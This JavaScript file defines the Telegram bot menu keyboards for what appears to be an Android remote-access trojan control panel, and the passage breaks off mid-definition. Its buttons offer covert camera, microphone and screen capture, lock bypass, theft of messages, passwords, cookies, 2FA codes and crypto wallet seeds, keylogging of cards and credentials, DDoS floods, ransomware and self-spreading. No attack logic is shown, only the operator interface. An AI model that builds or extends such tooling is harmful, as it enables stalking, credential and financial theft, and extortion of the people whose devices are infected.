const { Markup } = require('telegraf');

class Keyboards {
    // ==================== MAIN KEYBOARD (50+ CATEGORIES) ====================
    static getMainKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('📸🎥 CAMERA ULTIMATE (25)', 'section_camera')],
            [Markup.button.callback('🎙️🔊 AUDIO ULTIMATE (20)', 'section_audio')],
            [Markup.button.callback('💡✨ FLASHLIGHT ULTIMATE (15)', 'section_flash')],
            [Markup.button.callback('📳💫 VIBRATION ULTIMATE (15)', 'section_vibe')],
            [Markup.button.callback('🌐📶 NETWORK ULTIMATE (35)', 'section_network')],
            [Markup.button.callback('🔒🔓 SECURITY ULTIMATE (30)', 'section_security')],
            [Markup.button.callback('💾📁 DATA EXTRACTION (40)', 'section_data')],
            [Markup.button.callback('📂🗃️ FILE MANAGER (30)', 'section_files')],
            [Markup.button.callback('🖥️📱 SCREEN ULTIMATE (25)', 'section_screen')],
            [Markup.button.callback('📱⚙️ APPS ULTIMATE (30)', 'section_apps')],
            [Markup.button.callback('⚙️🔧 SYSTEM ULTIMATE (35)', 'section_system')],
            [Markup.button.callback('⌨️📝 KEYLOGGER ULTIMATE (20)', 'section_keylog')],
            [Markup.button.callback('🌐🔍 BROWSER ULTIMATE (25)', 'section_browser')],
            [Markup.button.callback('📱🌐 SOCIAL MEDIA (25)', 'section_social')],
            [Markup.button.callback('💰🔐 CRYPTO WALLET (20)', 'section_crypto')],
            [Markup.button.callback('⚔️💀 DDOS ATTACK (20)', 'section_ddos')],
            [Markup.button.callback('💀⚠️ RANSOMWARE (20)', 'section_ransom')],
            [Markup.button.callback('🪱🐛 SPREADER (20)', 'section_spreader')],
            [Markup.button.callback('🎯💀 ZERO-CLICK (25)', 'section_zero')],
            [Markup.button.callback('⚡🔧 EXTRA ULTIMATE (30)', 'section_extra')],
            [Markup.button.callback('🔌💀 SESSION CONTROL (15)', 'section_session')],
            [Markup.button.callback('📊 STATISTICS', 'stats_menu')],
            [Markup.button.callback('⚙️ SETTINGS', 'settings_menu')],
            [Markup.button.callback('❓ HELP', 'help_menu')]
        ]);
    }

    // ==================== CAMERA KEYBOARD (25 BUTTONS) ====================
    static getCameraKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('📷 FRONT CAM', 'cam_front'), Markup.button.callback('📸 BACK CAM', 'cam_back'), Markup.button.callback('🔄 SWITCH', 'cam_switch')],
            [Markup.button.callback('🎥 VIDEO 5s', 'video_5'), Markup.button.callback('🎬 VIDEO 10s', 'video_10'), Markup.button.callback('🎞️ VIDEO 30s', 'video_30')],
            [Markup.button.callback('📹 VIDEO 60s', 'video_60'), Markup.button.callback('🎦 VIDEO 120s', 'video_120'), Markup.button.callback('🎥 VIDEO 300s', 'video_300')],
            [Markup.button.callback('📸 BURST 5X', 'cam_burst_5'), Markup.button.callback('📸 BURST 10X', 'cam_burst_10'), Markup.button.callback('📸 BURST 20X', 'cam_burst_20')],
            [Markup.button.callback('🌙 NIGHT MODE', 'cam_night'), Markup.button.callback('⚡ HDR MODE', 'cam_hdr'), Markup.button.callback('🎨 FILTERS', 'cam_filters')],
            [Markup.button.callback('🔍 ZOOM 2X', 'cam_zoom_2'), Markup.button.callback('🔍 ZOOM 4X', 'cam_zoom_4'), Markup.button.callback('🔍 ZOOM 8X', 'cam_zoom_8')],
            [Markup.button.callback('🔄 TIMELAPSE', 'cam_timelapse'), Markup.button.callback('🐢 SLOW MOTION', 'cam_slowmo'), Markup.button.callback('⚡ FAST MOTION', 'cam_fastmo')],
            [Markup.button.callback('📸 LIVE STREAM', 'cam_live'), Markup.button.callback('🎥 BACKGROUND REC', 'cam_bg_rec'), Markup.button.callback('🔒 STEALTH MODE', 'cam_stealth')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }

    // ==================== AUDIO KEYBOARD (20 BUTTONS) ====================
    static getAudioKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('🎤 MIC START', 'mic_start'), Markup.button.callback('🎤 MIC STOP', 'mic_stop'), Markup.button.callback('🎤 MIC 30s', 'mic_30')],
            [Markup.button.callback('🎙️ MIC 60s', 'mic_60'), Markup.button.callback('🎙️ MIC 300s', 'mic_300'), Markup.button.callback('🎙️ LIVE MIC', 'mic_live')],
            [Markup.button.callback('🔊 SPEAKER ON', 'speaker_on'), Markup.button.callback('🔇 SPEAKER OFF', 'speaker_off'), Markup.button.callback('📢 LOUD MODE', 'loud_mode')],
            [Markup.button.callback('🎧 HEADSET MODE', 'headset'), Markup.button.callback('🔊 VOL MAX', 'vol_max'), Markup.button.callback('🔉 VOL 75%', 'vol_75')],
            [Markup.button.callback('🔉 VOL 50%', 'vol_50'), Markup.button.callback('🔈 VOL 25%', 'vol_25'), Markup.button.callback('🔇 VOL 0%', 'vol_0')],
            [Markup.button.callback('🎵 EQ PRESET ROCK', 'eq_rock'), Markup.button.callback('🎵 EQ PRESET BASS', 'eq_bass'), Markup.button.callback('🎵 EQ PRESET POP', 'eq_pop')],
            [Markup.button.callback('🔊 SURROUND ON', 'surround_on'), Markup.button.callback('🔊 SURROUND OFF', 'surround_off'), Markup.button.callback('🎧 3D AUDIO', 'audio_3d')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }

    // ==================== FLASHLIGHT KEYBOARD (15 BUTTONS) ====================
    static getFlashKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('💡 FLASH ON', 'flash_on'), Markup.button.callback('💡 FLASH OFF', 'flash_off'), Markup.button.callback('✨ STROBE', 'flash_strobe')],
            [Markup.button.callback('⚡ FAST STROBE', 'flash_fast'), Markup.button.callback('🐢 SLOW STROBE', 'flash_slow'), Markup.button.callback('💥 SOS MODE', 'flash_sos')],
            [Markup.button.callback('🌈 RGB MODE', 'flash_rgb'), Markup.button.callback('🎨 COLOR CYCLE', 'flash_color'), Markup.button.callback('✨ CANDLE MODE', 'flash_candle')],
            [Markup.button.callback('🔆 BRIGHT 100%', 'bright_100'), Markup.button.callback('🔅 BRIGHT 75%', 'bright_75'), Markup.button.callback('🔆 BRIGHT 50%', 'bright_50')],
            [Markup.button.callback('🔅 BRIGHT 25%', 'bright_25'), Markup.button.callback('🌑 BRIGHT 0%', 'bright_0'), Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }

    // ==================== VIBRATION KEYBOARD (15 BUTTONS) ====================
    static getVibeKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('📳 VIBE 1s', 'vibe_1'), Markup.button.callback('📳 VIBE 3s', 'vibe_3'), Markup.button.callback('📳 VIBE 5s', 'vibe_5')],
            [Markup.button.callback('📳 VIBE 10s', 'vibe_10'), Markup.button.callback('📳 VIBE 30s', 'vibe_30'), Markup.button.callback('📳 VIBE 60s', 'vibe_60')],
            [Markup.button.callback('🎵 PATTERN 1', 'vibe_pattern_1'), Markup.button.callback('🎵 PATTERN 2', 'vibe_pattern_2'), Markup.button.callback('🎵 PATTERN 3', 'vibe_pattern_3')],
            [Markup.button.callback('🔁 LOOP VIBE', 'vibe_loop'), Markup.button.callback('💥 STRONG VIBE', 'vibe_strong'), Markup.button.callback('🌊 WAVE VIBE', 'vibe_wave')],
            [Markup.button.callback('⏹️ STOP VIBE', 'vibe_stop'), Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }

    // ==================== NETWORK KEYBOARD (35 BUTTONS) ====================
    static getNetworkKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('📶 WIFI ON', 'wifi_on'), Markup.button.callback('📶 WIFI OFF', 'wifi_off'), Markup.button.callback('🔍 WIFI SCAN', 'wifi_scan')],
            [Markup.button.callback('📊 WIFI INFO', 'wifi_info'), Markup.button.callback('🔑 WIFI PASSWORD', 'wifi_password'), Markup.button.callback('📡 WIFI SIGNAL', 'wifi_signal')],
            [Markup.button.callback('🔐 WIFI CRACK', 'wifi_crack'), Markup.button.callback('🌐 WIFI DEAUTH', 'wifi_deauth'), Markup.button.callback('📡 WIFI MONITOR', 'wifi_monitor')],
            [Markup.button.callback('📱 DATA ON', 'data_on'), Markup.button.callback('📱 DATA OFF', 'data_off'), Markup.button.callback('📊 DATA USAGE', 'data_usage')],
            [Markup.button.callback('📱 2G ONLY', 'data_2g'), Markup.button.callback('📱 3G ONLY', 'data_3g'), Markup.button.callback('📱 4G ONLY', 'data_4g')],
            [Markup.button.callback('📱 5G ONLY', 'data_5g'), Markup.button.callback('📱 AUTO NETWORK', 'data_auto'), Markup.button.callback('📱 CARRIER INFO', 'carrier_info')],
            [Markup.button.callback('✈️ AIRPLANE ON', 'airplane_on'), Markup.button.callback('✈️ AIRPLANE OFF', 'airplane_off'), Markup.button.callback('🔄 AIRPLANE TOGGLE', 'airplane_toggle')],
            [Markup.button.callback('🔗 BT ON', 'bt_on'), Markup.button.callback('🔗 BT OFF', 'bt_off'), Markup.button.callback('📡 BT SCAN', 'bt_scan')],
            [Markup.button.callback('🔗 BT PAIR', 'bt_pair'), Markup.button.callback('🔗 BT UNPAIR', 'bt_unpair'), Markup.button.callback('📡 BT DEVICES', 'bt_devices')],
            [Markup.button.callback('🌐 HOTSPOT ON', 'hotspot_on'), Markup.button.callback('🌐 HOTSPOT OFF', 'hotspot_off'), Markup.button.callback('🔑 HOTSPOT PASS', 'hotspot_pass')],
            [Markup.button.callback('🔒 VPN ON', 'vpn_on'), Markup.button.callback('🔒 VPN OFF', 'vpn_off'), Markup.button.callback('🌍 VPN CONFIG', 'vpn_config')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }

    // ==================== SECURITY KEYBOARD (30 BUTTONS) ====================
    static getSecurityKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('🔒 LOCK NOW', 'lock'), Markup.button.callback('🔓 UNLOCK', 'unlock'), Markup.button.callback('⏭️ SLIDE', 'slide')],
            [Markup.button.callback('🔢 BYPASS PIN', 'bypass_pin'), Markup.button.callback('🔐 BYPASS PATTERN', 'bypass_pattern'), Markup.button.callback('🔑 BYPASS PASSWORD', 'bypass_pass')],
            [Markup.button.callback('🔄 BYPASS FINGER', 'bypass_finger'), Markup.button.callback('👁️ BYPASS FACE', 'bypass_face'), Markup.button.callback('🔓 BYPASS ALL', 'bypass_all')],
            [Markup.button.callback('🔐 CHANGE PIN', 'change_pin'), Markup.button.callback('🔑 CHANGE PATTERN', 'change_pattern'), Markup.button.callback('🔒 CHANGE PASSWORD', 'change_pass')],
            [Markup.button.callback('👆 ADD FINGERPRINT', 'add_finger'), Markup.button.callback('👤 ADD FACE ID', 'add_face'), Markup.button.callback('🗑️ REMOVE LOCK', 'remove_lock')],
            [Markup.button.callback('🔒 ENCRYPT DEVICE', 'encrypt_device'), Markup.button.callback('🔓 DECRYPT DEVICE', 'decrypt_device'), Markup.button.callback('🔐 SECURE BOOT', 'secure_boot')],
            [Markup.button.callback('💀 FACTORY RESET', 'factory_reset'), Markup.button.callback('🔄 FORCE RESET', 'force_reset'), Markup.button.callback('⚡ HARD RESET', 'hard_reset')],
            [Markup.button.callback('🔐 ANTI-THEFT ON', 'antitheft_on'), Markup.button.callback('🔐 ANTI-THEFT OFF', 'antitheft_off'), Markup.button.callback('📍 FIND DEVICE', 'find_device')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }

    // ==================== DATA EXTRACTION KEYBOARD (40 BUTTONS) ====================
    static getDataKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('💬 ALL SMS', 'get_sms'), Markup.button.callback('📞 CALL LOGS', 'get_calls'), Markup.button.callback('👥 CONTACTS', 'get_contacts')],
            [Markup.button.callback('💬 SMS BY DATE', 'get_sms_date'), Markup.button.callback('📞 CALLS BY DATE', 'get_calls_date'), Markup.button.callback('👥 EXPORT CONTACTS', 'export_contacts')],
            [Markup.button.callback('🌍 LOCATION', 'get_location'), Markup.button.callback('📍 GPS TRACK', 'gps_track'), Markup.button.callback('🗺️ MAP VIEW', 'map_view')],
            [Markup.button.callback('📍 LIVE LOCATION', 'live_location'), Markup.button.callback('📜 LOC HISTORY', 'location_history'), Markup.button.callback('🗺️ GEO FENCE', 'geo_fence')],
            [Markup.button.callback('📸 ALL PHOTOS', 'get_photos'), Markup.button.callback('🎥 ALL VIDEOS', 'get_videos'), Markup.button.callback('🎵 ALL AUDIO', 'get_audio')],
            [Markup.button.callback('📄 DOCUMENTS', 'get_docs'), Markup.button.callback('📦 APK FILES', 'get_apk'), Markup.button.callback('🗂️ ALL FILES', 'get_all_files')],
            [Markup.button.callback('📸 PHOTOS BY DATE', 'get_photos_date'), Markup.button.callback('🎥 VIDEOS BY DATE', 'get_videos_date'), Markup.button.callback('🗑️ DELETED FILES', 'get_deleted')],
            [Markup.button.callback('🔑 SAVED PASS', 'get_passwords'), Markup.button.callback('🍪 BROWSER COOKIES', 'get_cookies'), Markup.button.callback('📜 BROWSER HIST', 'get_history')],
            [Markup.button.callback('📱 WHATSAPP DATA', 'get_whatsapp'), Markup.button.callback('📘 FACEBOOK DATA', 'get_facebook'), Markup.button.callback('📷 INSTAGRAM DATA', 'get_instagram')],
            [Markup.button.callback('🐦 TWITTER DATA', 'get_twitter'), Markup.button.callback('📱 TELEGRAM DATA', 'get_telegram'), Markup.button.callback('🎵 TIKTOK DATA', 'get_tiktok')],
            [Markup.button.callback('👻 SNAPCHAT DATA', 'get_snapchat'), Markup.button.callback('💼 LINKEDIN DATA', 'get_linkedin'), Markup.button.callback('📧 EMAIL DATA', 'get_email')],
            [Markup.button.callback('🔑 WIFI PASSWORDS', 'get_wifi_pass'), Markup.button.callback('📡 BLUETOOTH LOGS', 'get_bt_logs'), Markup.button.callback('📱 APP DATA', 'get_app_data')],
            [Markup.button.callback('📸 SCREENSHOTS', 'get_screenshots'), Markup.button.callback('🎥 SCREEN RECS', 'get_screen_recs'), Markup.button.callback('📋 CLIPBOARD', 'get_clipboard')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }

    // ==================== FILE MANAGER KEYBOARD (30 BUTTONS) ====================
    static getFileKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('📁 FILE MANAGER', 'file_manager'), Markup.button.callback('📥 DOWNLOAD', 'download_file'), Markup.button.callback('📤 UPLOAD', 'upload_file')],
            [Markup.button.callback('🗑️ DELETE', 'delete_file'), Markup.button.callback('📋 COPY', 'copy_file'), Markup.button.callback('✂️ MOVE', 'move_file')],
            [Markup.button.callback('📝 RENAME', 'rename_file'), Markup.button.callback('🔐 ZIP', 'zip_file'), Markup.button.callback('🔓 UNZIP', 'unzip')],
            [Markup.button.callback('🔒 ENCRYPT', 'encrypt_file'), Markup.button.callback('🔓 DECRYPT', 'decrypt_file'), Markup.button.callback('📊 FILE INFO', 'file_info')],
            [Markup.button.callback('📁 CREATE FOLDER', 'create_folder'), Markup.button.callback('🗑️ DELETE FOLDER', 'delete_folder'), Markup.button.callback('📋 FOLDER INFO', 'folder_info')],
            [Markup.button.callback('🔍 SEARCH FILES', 'search_files'), Markup.button.callback('📊 STORAGE MAP', 'storage_map'), Markup.button.callback('🧹 CLEAN JUNK', 'clean_junk')],
            [Markup.button.callback('💾 BACKUP ALL', 'backup_all'), Markup.button.callback('🔄 RESTORE', 'restore_backup'), Markup.button.callback('☁️ CLOUD BACKUP', 'cloud_backup')],
            [Markup.button.callback('📂 ROOT DIRECTORY', 'root_dir'), Markup.button.callback('📂 DOWNLOADS', 'downloads_dir'), Markup.button.callback('📂 DCIM', 'dcim_dir')],
            [Markup.button.callback('📂 PICTURES', 'pictures_dir'), Markup.button.callback('📂 MUSIC', 'music_dir'), Markup.button.callback('📂 VIDEOS', 'videos_dir')],
            [Markup.button.callback('📂 DOCUMENTS', 'documents_dir'), Markup.button.callback('📂 ANDROID', 'android_dir'), Markup.button.callback('📂 DATA', 'data_dir')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }

    // ==================== SCREEN KEYBOARD (25 BUTTONS) ====================
    static getScreenKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('📸 SCREENSHOT', 'screenshot'), Markup.button.callback('🎥 SCREEN REC', 'screen_rec'), Markup.button.callback('⏹️ STOP REC', 'screen_rec_stop')],
            [Markup.button.callback('🎥 REC 30s', 'screen_rec_30'), Markup.button.callback('🎥 REC 60s', 'screen_rec_60'), Markup.button.callback('🎥 REC 300s', 'screen_rec_300')],
            [Markup.button.callback('🎥 REC CUSTOM', 'screen_rec_custom'), Markup.button.callback('🎥 LIVE STREAM', 'screen_live'), Markup.button.callback('📡 SCREEN CAST', 'screen_cast')],
            [Markup.button.callback('🖼️ WALLPAPER', 'wallpaper'), Markup.button.callback('🔆 BRIGHT UP', 'bright_up'), Markup.button.callback('🔅 BRIGHT DOWN', 'bright_down')],
            [Markup.button.callback('🌙 DARK MODE', 'dark_mode'), Markup.button.callback('☀️ LIGHT MODE', 'light_mode'), Markup.button.callback('🎨 THEMES', 'themes')],
            [Markup.button.callback('📱 SCREEN ON', 'screen_on'), Markup.button.callback('📱 SCREEN OFF', 'screen_off'), Markup.button.callback('🔄 SCREEN TOGGLE', 'screen_toggle')],
            [Markup.button.callback('📱 SCREEN TIMEOUT 15s', 'timeout_15'), Markup.button.callback('📱 SCREEN TIMEOUT 30s', 'timeout_30'), Markup.button.callback('📱 SCREEN TIMEOUT 1m', 'timeout_60')],
            [Markup.button.callback('📱 SCREEN TIMEOUT 5m', 'timeout_300'), Markup.button.callback('📱 SCREEN TIMEOUT NEVER', 'timeout_never'), Markup.button.callback('🔄 ROTATION LOCK', 'rotation_lock')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }

    // ==================== APPS KEYBOARD (30 BUTTONS) ====================
    static getAppsKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('📋 INSTALLED APPS', 'list_apps'), Markup.button.callback('🚀 OPEN APP', 'open_app'), Markup.button.callback('❌ UNINSTALL', 'uninstall_app')],
            [Markup.button.callback('🔄 FORCE STOP', 'force_stop'), Markup.button.callback('⚡ CLEAR DATA', 'clear_app_data'), Markup.button.callback('🗑️ CLEAR CACHE', 'clear_cache')],
            [Markup.button.callback('📦 INSTALL APK', 'install_apk'), Markup.button.callback('🔒 HIDE APP', 'hide_app'), Markup.button.callback('🔓 UNHIDE APP', 'unhide_app')],
            [Markup.button.callback('📊 APP USAGE', 'app_usage'), Markup.button.callback('⏱️ APP TIMER', 'app_timer'), Markup.button.callback('🚫 BLOCK APP', 'block_app')],
            [Markup.button.callback('🔄 BACKUP APP', 'backup_app'), Markup.button.callback('📤 SHARE APP', 'share_app'), Markup.button.callback('🔍 APP DETAILS', 'app_details')],
            [Markup.button.callback('📱 SYSTEM APPS', 'system_apps'), Markup.button.callback('🔧 DISABLE APP', 'disable_app'), Markup.button.callback('🔧 ENABLE APP', 'enable_app')],
            [Markup.button.callback('🔐 APP LOCK', 'app_lock'), Markup.button.callback('📊 APP PERMISSIONS', 'app_permissions'), Markup.button.callback('🔄 APP ACTIVITIES', 'app_activities')],
            [Markup.button.callback('📦 SIDE LOAD', 'side_load'), Markup.button.callback('🔧 MOD APK', 'mod_apk'), Markup.button.callback('📱 CLONE APP', 'clone_app')],
            [Markup.button.callback('🎮 GAME MODE', 'game_mode'), Markup.button.callback('📱 KIDS MODE', 'kids_mode'), Markup.button.callback('🔒 PRIVATE MODE', 'private_mode')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }

    // ==================== SYSTEM KEYBOARD (35 BUTTONS) ====================
    static getSystemKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('ℹ️ SYSTEM INFO', 'sysinfo'), Markup.button.callback('🔋 BATTERY', 'battery'), Markup.button.callback('💾 RAM INFO', 'ram_info')],
            [Markup.button.callback('📀 STORAGE', 'storage'), Markup.button.callback('📱 DEVICE ID', 'device_id'), Markup.button.callback('🔐 ROOT STATUS', 'root_status')],
            [Markup.button.callback('🌡️ TEMPERATURE', 'temperature'), Markup.button.callback('📊 CPU INFO', 'cpu_info'), Markup.button.callback('🎮 GPU INFO', 'gpu_info')],
            [Markup.button.callback('🔋 BATTERY SAVE', 'battery_save'), Markup.button.callback('⚡ PERFORMANCE', 'performance'), Markup.button.callback('🧹 CLEAN JUNK', 'clean_junk_sys')],
            [Markup.button.callback('🔄 REBOOT', 'reboot'), Markup.button.callback('⏻ POWER OFF', 'poweroff'), Markup.button.callback('💀 FACTORY RESET', 'factory_reset_sys')],
            [Markup.button.callback('📱 BOOTLOADER', 'bootloader'), Markup.button.callback('🔧 RECOVERY MODE', 'recovery'), Markup.button.callback('📲 FASTBOOT', 'fastboot')],
            [Markup.button.callback('🔒 ENABLE USB DBG', 'usb_debug'), Markup.button.callback('🔓 DISABLE USB DBG', 'usb_debug_off'), Markup.button.callback('📡 DEV OPTIONS', 'developer_opts')],
            [Markup.button.callback('🔐 SELINUX ENFORCE', 'selinux_enforce'), Markup.button.callback('🔓 SELINUX PERMISSIVE', 'selinux_permissive'), Markup.button.callback('🔧 KERNEL INFO', 'kernel_info')],
            [Markup.button.callback('📊 PROCESSES', 'processes'), Markup.button.callback('📡 NETWORK STATS', 'network_stats'), Markup.button.callback('🔍 PORT SCAN', 'port_scan')],
            [Markup.button.callback('🌐 IP INFO', 'ip_info'), Markup.button.callback('📱 SCREEN INFO', 'screen_info'), Markup.button.callback('🔧 DEVICE SETTINGS', 'device_settings')],
            [Markup.button.callback('🔐 SECURITY CHECK', 'security_check'), Markup.button.callback('📊 BENCHMARK', 'benchmark'), Markup.button.callback('🔧 HARDWARE TEST', 'hardware_test')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }

    // ==================== KEYLOGGER KEYBOARD (20 BUTTONS) ====================
    static getKeylogKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('⌨️ START LOG', 'keylog_start'), Markup.button.callback('⌨️ STOP LOG', 'keylog_stop'), Markup.button.callback('📋 GET LOGS', 'keylog_get')],
            [Markup.button.callback('📊 LOG STATS', 'keylog_stats'), Markup.button.callback('🗑️ CLEAR LOGS', 'keylog_clear'), Markup.button.callback('📤 UPLOAD LOGS', 'keylog_upload')],
            [Markup.button.callback('🔑 CAPTURE PASS', 'keylog_pass'), Markup.button.callback('💳 CAPTURE CARDS', 'keylog_cards'), Markup.button.callback('📧 EMAIL LOGS', 'keylog_email')],
            [Markup.button.callback('📊 LIVE KEYLOG', 'keylog_live'), Markup.button.callback('🔍 SEARCH LOGS', 'keylog_search'), Markup.button.callback('📈 KEYLOG STATS', 'keylog_stats_adv')],
            [Markup.button.callback('🎯 CAPTURE CREDENTIALS', 'keylog_creds'), Markup.button.callback('🔐 CAPTURE TOKENS', 'keylog_tokens'), Markup.button.callback('📱 APP KEYLOGS', 'keylog_apps')],
            [Markup.button.callback('🌐 BROWSER KEYLOGS', 'keylog_browser'), Markup.button.callback('💬 CHAT KEYLOGS', 'keylog_chat'), Markup.button.callback('📧 EMAIL KEYLOGS', 'keylog_email_spec')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }

    // ==================== BROWSER KEYBOARD (25 BUTTONS) ====================
    static getBrowserKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('📜 HISTORY', 'browser_history'), Markup.button.callback('🔖 BOOKMARKS', 'browser_bookmarks'), Markup.button.callback('🍪 COOKIES', 'browser_cookies')],
            [Markup.button.callback('🔑 PASSWORDS', 'browser_passwords'), Markup.button.callback('💳 SAVED CARDS', 'browser_cards'), Markup.button.callback('📝 AUTO FILL', 'browser_autofill')],
            [Markup.button.callback('📊 BROWSER STATS', 'browser_stats'), Markup.button.callback('🗑️ CLEAR DATA', 'browser_clear'), Markup.button.callback('🌐 OPEN URL', 'browser_open')],
            [Markup.button.callback('🔍 SEARCH HIST', 'search_history'), Markup.button.callback('📥 DOWNLOADS', 'browser_downloads'), Markup.button.callback('🔧 SETTINGS', 'browser_settings')],
            [Markup.button.callback('🌐 INJECT SCRIPT', 'inject_script'), Markup.button.callback('🔍 DARK WEB', 'dark_web'), Markup.button.callback('📡 NETWORK LOGS', 'network_logs')],
            [Markup.button.callback('🔐 EXPORT PASSWORDS', 'export_passwords'), Markup.button.callback('📜 EXPORT HISTORY', 'export_history'), Markup.button.callback('🍪 EXPORT COOKIES', 'export_cookies')],
            [Markup.button.callback('🌐 CHROME DATA', 'chrome_data'), Markup.button.callback('🦊 FIREFOX DATA', 'firefox_data'), Markup.button.callback('🧭 EDGE DATA', 'edge_data')],
            [Markup.button.callback('🔐 DECRYPT PASSWORDS', 'decrypt_passwords'), Markup.button.callback('🔍 VULN SCAN', 'browser_vuln'), Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }

    // ==================== SOCIAL MEDIA KEYBOARD (25 BUTTONS) ====================
    static getSocialKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('📘 FACEBOOK', 'fb_data'), Markup.button.callback('📷 INSTAGRAM', 'ig_data'), Markup.button.callback('💬 WHATSAPP', 'wa_data')],
            [Markup.button.callback('🐦 TWITTER', 'twitter_data'), Markup.button.callback('📱 TELEGRAM', 'tg_data'), Markup.button.callback('🎵 TIKTOK', 'tiktok_data')],
            [Markup.button.callback('👻 SNAPCHAT', 'snapchat_data'), Markup.button.callback('💼 LINKEDIN', 'linkedin_data'), Markup.button.callback('📧 GMAIL', 'gmail_data')],
            [Markup.button.callback('🔑 SOCIAL PASS', 'social_pass'), Markup.button.callback('📜 SOCIAL HIST', 'social_history'), Markup.button.callback('🍪 SOCIAL COOKIES', 'social_cookies')],
            [Markup.button.callback('💬 FB MESSAGES', 'fb_messages'), Markup.button.callback('💬 IG MESSAGES', 'ig_messages'), Markup.button.callback('💬 WA MESSAGES', 'wa_messages')],
            [Markup.button.callback('🔓 SOCIAL HACK', 'social_hack'), Markup.button.callback('📊 SOCIAL STATS', 'social_stats'), Markup.button.callback('🔐 2FA BYPASS', 'bypass_2fa')],
            [Markup.button.callback('📸 FB PHOTOS', 'fb_photos'), Markup.button.callback('📸 IG PHOTOS', 'ig_photos'), Markup.button.callback('🎵 TIKTOK VIDEOS', 'tiktok_videos')],
            [Markup.button.callback('👥 FB FRIENDS', 'fb_friends'), Markup.button.callback('👥 IG FOLLOWERS', 'ig_followers'), Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }

    // ==================== CRYPTO KEYBOARD (20 BUTTONS) ====================
    static getCryptoKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('💰 BITCOIN', 'btc_wallet'), Markup.button.callback('💎 ETHEREUM', 'eth_wallet'), Markup.button.callback('🪙 BINANCE', 'binance_data')],
            [Markup.button.callback('📊 CRYPTO BAL', 'crypto_balance'), Markup.button.callback('🔑 PRIVATE KEYS', 'private_keys'), Markup.button.callback('📜 TRANSACTIONS', 'crypto_tx')],
            [Markup.button.callback('💱 EXCHANGE API', 'exchange_api'), Markup.button.callback('🔐 WALLET SEED', 'wallet_seed'), Markup.button.callback('🌐 BLOCKCHAIN', 'blockchain_data')],
            [Markup.button.callback('🖼️ NFT DATA', 'nft_data'), Markup.button.callback('💰 DEFI DATA', 'defi_data'), Markup.button.callback('📊 MARKET DATA', 'market_data')],
            [Markup.button.callback('🔑 METAMASK', 'metamask_data'), Markup.button.callback('🔑 TRUST WALLET', 'trust_wallet'), Markup.button.callback('🔑 COINBASE', 'coinbase_data')],
            [Markup.button.callback('📈 PRICE ALERT', 'price_alert'), Markup.button.callback('💸 SEND CRYPTO', 'send_crypto'), Markup.button.callback('💰 CRYPTO MINING', 'crypto_mining')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }

    // ==================== DDOS KEYBOARD (20 BUTTONS) ====================
    static getDdosKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('🌐 HTTP FLOOD', 'http_flood'), Markup.button.callback('📡 UDP FLOOD', 'udp_flood'), Markup.button.callback('🔌 TCP FLOOD', 'tcp_flood')],
            [Markup.button.callback('📱 SMS BOMB', 'sms_bomb'), Markup.button.callback('📞 CALL BOMB', 'call_bomb'), Markup.button.callback('🔗 DDOS STOP', 'ddos_stop')],
            [Markup.button.callback('🌐 DNS AMP', 'dns_amp'), Markup.button.callback('🔍 NTP AMP', 'ntp_amp'), Markup.button.callback('💀 SLOWLORIS', 'slowloris')],
            [Markup.button.callback('🌐 HTTP/2 FLOOD', 'http2_flood'), Markup.button.callback('📡 AMPLIFICATION', 'amp_attack'), Markup.button.callback('🔌 SYN FLOOD', 'syn_flood')],
            [Markup.button.callback('🎯 UDP AMP', 'udp_amp'), Markup.button.callback('📡 ICMP FLOOD', 'icmp_flood'), Markup.button.callback('🔗 SSL RENEG', 'ssl_reneg')],
            [Markup.button.callback('📊 ATTACK STATS', 'attack_stats'), Markup.button.callback('🎯 TARGET INFO', 'target_info'), Markup.button.callback('⚙️ ATTACK SETTINGS', 'attack_settings')],
            [Markup.button.callback('🔙 BACK', 'back_main')]
        ]);
    }

    // ==================== RANSOMWARE KEYBOARD (20 BUTTONS) ====================
    static getRansomKeyboard() {
        return Markup.inlineKeyboard([
            [Markup.button.callback('🔒 ENCRYPT FILES', 'ransom_encrypt'), Markup.button.callback('🔓 DECRYPT FILES', 'ransom_decrypt'), Markup.button.callback('💰 RANSOM NOTE', 'ransom_note')],
            [Markup.button.callback('🗑️ WIPE DATA', 'wipe_data'), Markup.button.callback('📱 WIPE SD CARD', 'wipe_sd'), Markup.button.callback('💀 DESTROY SYSTEM', 'destroy_system')],
            [Markup.button.callback('🔒 LOCK FILES', 'lock_files'), Markup.button.callback('💰 BITCOIN ADDR', 'bitcoin_addr'), Markup.button.callback('⏰ RANSOM TIMER', 'ransom_timer')],
